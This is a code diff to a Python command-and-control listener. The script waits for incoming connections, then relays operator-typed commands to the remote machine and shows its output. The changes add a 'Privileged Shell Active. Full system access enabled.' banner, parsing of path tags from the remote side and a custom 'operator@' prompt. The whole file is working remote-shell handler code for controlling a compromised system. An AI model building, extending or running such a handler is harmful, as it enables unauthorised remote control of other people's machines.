@@ -1,6 +1,7 @@
 import socket
 import sys
 import time
+import re
 
 def main():
     host = "0.0.0.0"
@@ -25,15 +26,27 @@ def main():
         try:
             conn, addr = server.accept()
             print(f"\n[+] SECURE LINK ESTABLISHED: {addr[0]}:{addr[1]}")
+            print("[*] Privileged Shell Active. Full system access enabled.")
             print("[*] Controls: 'quit' to close, any other text to execute.")
             print("----------------------------------------")
 
             conn.settimeout(None)
             
+            # Get initial greeting
+            initial_data = conn.recv(1024).decode("utf-8")
+            print(initial_data.strip())
+            
+            current_path = "v-hunter"
+            path_match = re.search(r"Current Path: (.*)", initial_data)
+            if path_match:
+                current_path = path_match.group(1).strip()
+
             while True:
-                cmd = input("operator@v-hunter ~ $ ").strip()
+                # Custom prompt based on current path
+                prompt_display = os.path.basename(current_path) if current_path != "v-hunter" else "system"
+                cmd = input(f"operator@{prompt_display} $ ").strip()
+                
                 if not cmd:
-                    # Optional: send a ping to check if still alive
                     try:
                         conn.send(b"ping\n")
                         conn.settimeout(2.0)
@@ -51,10 +64,24 @@ def main():
                         break
                     
                     # Receive output
-                    conn.settimeout(5.0)
-                    response = conn.recv(8192).decode("utf-8")
+                    conn.settimeout(10.0)
+                    response = conn.recv(16384).decode("utf-8")
+                    
+                    # Parse path info from output if present
+                    path_tags = re.findall(r"\[PATH: (.*)\]", response)
+                    if path_tags:
+                        current_path = path_tags[-1].strip()
+                        # Strip the path tag from the displayed output
+                        response = re.sub(r"\[PATH: .*\]", "", response).strip()
+                    
+                    # Catch directory change notification specifically
+                    dir_match = re.search(r"\[DIRECTORY CHANGED\] -> (.*)", response)
+                    if dir_match:
+                        current_path = dir_match.group(1).strip()
+
                     print(response)
                     conn.settimeout(None)
+                    
                 except socket.timeout:
                     print("[!] Command timeout: No response from system.")
                 except Exception as e:
@@ -70,4 +97,5 @@ def main():
     print("\n[*] Command Center shutdown.")
 
 if __name__ == "__main__":
+    import os # Needed for os.path.basename
     main()
